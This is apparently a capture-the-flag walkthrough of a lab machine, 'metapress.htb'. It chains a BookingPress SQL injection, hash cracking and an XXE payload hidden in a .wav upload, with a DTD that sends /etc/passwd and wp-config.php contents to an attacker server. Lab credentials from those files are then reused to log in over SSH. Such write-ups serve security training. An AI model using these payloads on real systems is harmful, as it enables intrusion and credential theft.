We meet a WordPress site immediately, and we see through nmap that its version 5.6.2. When searchsploiting this we realize that this particular version of WP is vulnerable to SQL injection:
``https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357``
It is specifically related to the WordPress-plugin "BookingPress" which fails to properly sanitize user-supplied POST data before that is used in a SQL query via bookingpress_front_get_category_services AJAX action. 

Proof of concept payload looks like this:
```bash
curl -i 'https://example.com/wp-admin/admin-ajax.php' \ 
--data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

In order to construct our payload, we need to supply the custom ``_wpnonce`` that we can extract from a simple GET request to /events which in my case is: ``27bb5d419``. 

Now we would like to catch this request in Burp Suite, and to do that, we have to add the flag -x and our localhost onto our curl:

``-x http://127.0.0.1:8080`` 

This lands us the request:
```
POST /wp-admin/admin-ajax.php HTTP/1.1 
Host: metapress.htb 
User-Agent: curl/7.86.0 Accept: */* 
Content-Length: 185 
Content-Type: application/x-www-form-urlencoded 
Connection: close action=bookingpress_front_get_category_services&_wpnonce=27bb5d419c&category_id=33&total_service=-7509) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -
```

Now we want to modify this so that we can use this in SQLmap. So we remove the injection and also change the service from -7509 to 0 and save it to a text file, and then we run:

``sqlmap -r sqli.txt -p total_service --dbs``

Essentially our sqlmap ends up giving us these credientals:

```
user: admin@metapress.htb
password: $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.

user: manager@metapress.htb
password: $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```   

So now it's a matter of cracking these hashes. The admin-account does not appear to be crackable, however the manager-account is very quickly cracked through:

``hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt``
``$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar``

Bam, we login! We see an upload function on the admin panel, and this screams of our way in. We start by enumerating which types of files it'll take, and it seems to be .wav and .txt. Various filter-bypasses like php3, php4, and Magic Number edit yield no result. No client-side filters.

However, when searchsploiting upload to admin panel, we stumble upon a very interesting CVE:

``https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/``

We start off by simply making a .wav file and type in our payload:

``nano poc.wav echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSERVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav``

Then we create our .dtd file:

``<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd"> <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >``

Now we need to start a php-server:

``php -S 0.0.0.0:PORT`` with our VPN IP.

Now we upload the .wav-file, and we get file-read through our php-server:

![[Pasted image 20230219224256.png]]

We can then decode it using php:

```php
php -r 'echo zlib_decode(base64_decode("jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=="));'
```

Which gave us:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

So now we have to figure out the path to the wp_config.php file. We know the default directory of the nginx webserver, so we adjust our payload to read the default file:

```php
server {

        listen 80;
        listen [::]:80;

        root /var/www/metapress.htb/blog;

        index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

        location / {
                try_files $uri $uri/ /index.php?$args;
        }
    
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }

}
```

This gives us the directory
``/var/www/metapress.htb/blog``

So we adjust our payload to read wp-config.php and we get the results:
```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

```

We get FTP credentials, time to log in to that. We ls our way to emails where we find:

```php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

```

We use the jnelson credentials to SSH, as we've seen its an user when we read the etc/passwd.

``Cb4_JmWM8zUZWMu@Ys``

